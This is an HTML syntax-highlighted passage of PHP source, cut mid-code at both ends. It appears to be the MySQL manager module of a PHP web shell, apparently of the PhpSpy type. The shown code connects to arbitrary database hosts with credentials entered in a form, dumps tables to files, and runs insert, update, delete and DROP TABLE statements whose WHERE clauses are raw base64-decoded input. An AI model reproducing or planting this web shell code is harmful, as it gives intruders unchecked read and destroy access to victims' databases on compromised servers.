<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Please choose the table'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mysqllink</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mydbconn(</span>$<span style="color: #eab700;">dbhost</span>,$<span style="color: #eab700;">dbuser</span>,$<span style="color: #eab700;">dbpass</span>,$<span style="color: #eab700;">dbname</span>,$<span style="color: #eab700;">charset</span>,$<span style="color: #eab700;">dbpo</span><span style="color: #eab700; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fp</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">fopen(</span>$<span style="color: #eab700;">path</span>,<span style="color: #3e999f;">'w'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">fp</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span>($<span style="color: #eab700;">table</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">k</span> =&gt; $<span style="color: #eab700;">v</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">v</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">sqldumptable(</span>$<span style="color: #eab700;">v</span>, $<span style="color: #eab700;">fp</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">fclose(</span>$<span style="color: #eab700;">fp</span>);<span style="color: #c82829; background-color: #d6d6d6;">                </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fileurl</span> = <span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span><span style="color: #c82829; font-weight: bold;">SA_ROOT</span>,<span style="color: #3e999f;">''</span>,$<span style="color: #eab700;">path</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Database has success backup to &lt;a href="'</span>.$<span style="color: #eab700;">fileurl</span>.<span style="color: #3e999f;">'" target=</span><span style="color: #3e999f; text-decoration: underline;">"_blank"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">path</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">mysql_close(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Backup failed'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">insert</span> &amp;&amp; $<span style="color: #eab700;">insertsql</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">keystr</span> = $<span style="color: #eab700;">valstr</span> = $<span style="color: #eab700;">tmp</span> = <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span>($<span style="color: #eab700;">insertsql</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">key</span> =&gt; $<span style="color: #eab700;">val</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">val</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">keystr</span> .= $<span style="color: #eab700;">tmp</span><span style="color: #c82829; font-weight: bold;">.</span>$<span style="color: #eab700;">key</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">valstr</span> .= $<span style="color: #eab700;">tmp</span>.<span style="color: #3e999f;">"'"</span>.<span style="color: #4d4d4c; background-color: #ffffff;">addslashes(</span>$<span style="color: #eab700;">val</span>).<span style="color: #3e999f;">"'"</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">tmp</span> = <span style="color: #3e999f;">','</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">keystr</span> &amp;&amp; $<span style="color: #eab700;">valstr</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mysqllink</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mydbconn(</span>$<span style="color: #eab700;">dbhost</span>,$<span style="color: #eab700;">dbuser</span>,$<span style="color: #eab700;">dbpass</span>,$<span style="color: #eab700;">dbname</span>,$<span style="color: #eab700;">charset</span>,$<span style="color: #eab700;">dbpo</span><span style="color: #eab700; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(q(</span><span style="color: #3e999f;">"INSERT INTO $tablename ($keystr) VALUES ($valstr)"</span>) ? <span style="color: #3e999f;">'Insert n</span><span style="color: #3e999f; text-decoration: underline;">ew record of success'</span><span style="text-decoration: underline;"> : </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">update</span> &amp;&amp; $<span style="color: #eab700;">insertsql</span> &amp;&amp; $<span style="color: #eab700;">base64</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">valstr</span> = $<span style="color: #eab700;">tmp</span> = <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span>($<span style="color: #eab700;">insertsql</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">key</span> =&gt; $<span style="color: #eab700;">val</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">valstr</span> .= $<span style="color: #eab700;">tmp</span><span style="color: #c82829; font-weight: bold;">.</span>$<span style="color: #eab700;">key</span>.<span style="color: #3e999f;">"='"</span>.<span style="color: #4d4d4c; background-color: #ffffff;">addslashes(</span>$<span style="color: #eab700;">val</span>).<span style="color: #3e999f;">"'"</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">tmp</span> = <span style="color: #3e999f;">','</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">valstr</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">where</span> = <span style="color: #4d4d4c; background-color: #ffffff;">base64_decode(</span>$<span style="color: #eab700;">base64</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mysqllink</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mydbconn(</span>$<span style="color: #eab700;">dbhost</span>,$<span style="color: #eab700;">dbuser</span>,$<span style="color: #eab700;">dbpass</span>,$<span style="color: #eab700;">dbname</span>,$<span style="color: #eab700;">charset</span>,$<span style="color: #eab700;">dbpo</span><span style="color: #eab700; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(q(</span><span style="color: #3e999f;">"UPDATE $tablename SET $valstr WHERE $where LIMIT 1"</span>) ? <span style="color: #3e999f;">'Record </span><span style="color: #3e999f; text-decoration: underline;">updating'</span><span style="text-decoration: underline;"> : </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">doing</span> == <span style="color: #3e999f;">'del'</span> &amp;&amp; $<span style="color: #eab700;">base64</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">where</span> = <span style="color: #4d4d4c; background-color: #ffffff;">base64_decode(</span>$<span style="color: #eab700;">base64</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">delete_sql</span> = <span style="color: #3e999f;">"DELETE FROM $tablename WHERE $where"</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mysqllink</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mydbconn(</span>$<span style="color: #eab700;">dbhost</span>,$<span style="color: #eab700;">dbuser</span>,$<span style="color: #eab700;">dbpass</span>,$<span style="color: #eab700;">dbname</span>,$<span style="color: #eab700;">charset</span>,$<span style="color: #eab700;">dbport</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(q(</span><span style="color: #3e999f;">"DELETE FROM $tablename WHERE $where"</span>) ? <span style="color: #3e999f;">'Deletion record of success</span><span style="color: #3e999f; text-decoration: underline;">'</span><span style="text-decoration: underline;"> : </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">tablename</span> &amp;&amp; $<span style="color: #eab700;">doing</span> == <span style="color: #3e999f;">'drop'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mysqllink</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mydbconn(</span>$<span style="color: #eab700;">dbhost</span>,$<span style="color: #eab700;">dbuser</span>,$<span style="color: #eab700;">dbpass</span>,$<span style="color: #eab700;">dbname</span>,$<span style="color: #eab700;">charset</span>,$<span style="color: #eab700;">dbport</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"DROP TABLE $tablename"</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Drop table of success'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">tablename</span> = <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(mysql_error(</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'MYSQL Manager'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'mysqladmin'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'DBHost:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'dbhost'</span>,<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">20</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">dbhost</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">':'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'dbport'</span>,<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">4</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">dbport</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'DBUser:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'dbuser'</span>,<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">15</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">dbuser</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'DBPass:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'dbpass'</span>,<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">15</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">dbpass</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'DBCharset:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeselect(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'charset'</span>,<span style="color: #3e999f;">'option'</span>=&gt;$<span style="color: #eab700;">charsetdb</span>,<span style="color: #3e999f;">'selected'</span>=&gt;$<span style="color: #eab700;">charset</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'nokey'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'connect'</span>,<span style="color: #3e999f;">'value'</span>=&gt;<span style="color: #3e999f;">'Connect'</span>,<span style="color: #3e999f;">'type'</span>=&gt;<span style="color: #3e999f;">'submit'</span>,<span style="color: #3e999f;">'class</span><span style="color: #3e999f; text-decoration: underline;">'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #3e999f; text-decoration: underline;">'bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#25805;&#20316;&#35760;&#24405;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'recordlist'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'doing'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'mysqladmin'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'base64'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'tablename'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span>$<span style="color: #eab700;">dbform</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#36873;&#23450;&#25968;&#25454;&#24211;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'setdbname'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'mysqladmin'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span>$<span style="color: #eab700;">dbform</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!$<span style="color: #eab700;">dbname</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dbname'</span>);
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#36873;&#23450;&#34920;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'settable'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'mysqladmin'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span>$<span style="color: #eab700;">dbform</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'tablename'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'page'</span>,$<span style="color: #eab700;">page</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'doing'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);

<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">cachetables</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);<span style="color: #c82829; background-color: #d6d6d6;">     </span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">pagenum</span> = <span style="color: #4d4d4c; background-color: #ffffff;">30</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">page</span> = <span style="color: #4d4d4c; background-color: #ffffff;">intval(</span>$<span style="color: #eab700;">page</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">page</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">start_limit</span> = ($<span style="color: #eab700;">page</span> - <span style="color: #4d4d4c; background-color: #ffffff;">1</span>) * $<span style="color: #eab700;">pagenum</span>;
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">start_limit</span> = <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">page</span> = <span style="color: #4d4d4c; background-color: #ffffff;">1</span>;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">isset(</span>$<span style="color: #eab700;">dbhost</span>) &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">isset(</span>$<span style="color: #eab700;">dbuser</span>) &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">isset(</span>$<span style="color: #eab700;">dbpass</span>) &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">isset(</span>$<span style="color: #eab700;">connect</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mysqllink</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mydbconn(</span>$<span style="color: #eab700;">dbhost</span>, $<span style="color: #eab700;">dbuser</span>, $<span style="color: #eab700;">dbpass</span>, $<span style="color: #eab700;">dbname</span>, $<span style="color: #eab700;">charset</span>, $<span style="color: #eab700;">dbp</span><span style="color: #eab700; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#33719;&#21462;&#25968;&#25454;&#24211;&#20449;&#24687;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mysqlver</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mysql_get_server_info(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;MySQL '</span>.$<span style="color: #eab700;">mysqlver</span>.<span style="color: #3e999f;">' running in '</span>.$<span style="color: #eab700;">dbhost</span>.<span style="color: #3e999f;">' as '</span>.$<span style="color: #eab700;">dbuser</span>.<span style="color: #3e999f;">'@'</span>.$<span style="color: #eab700;">dbhos</span><span style="color: #eab700; text-decoration: underline;">t</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">highver</span> = $<span style="color: #eab700;">mysqlver</span> &gt; <span style="color: #3e999f;">'4.1'</span> ? <span style="color: #4d4d4c; background-color: #ffffff;">1</span> : <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;

<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#33719;&#21462;&#25968;&#25454;&#24211;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">query</span> = <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"SHOW DATABASES"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dbs</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dbs</span>[] = <span style="color: #3e999f;">'-- Select a database --'</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span>($<span style="color: #eab700;">db</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mysql_fetch_array(</span>$<span style="color: #eab700;">query</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dbs</span>[$<span style="color: #eab700;">db</span>[<span style="color: #3e999f;">'Database'</span>]] = $<span style="color: #eab700;">db</span>[<span style="color: #3e999f;">'Database'</span>];
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
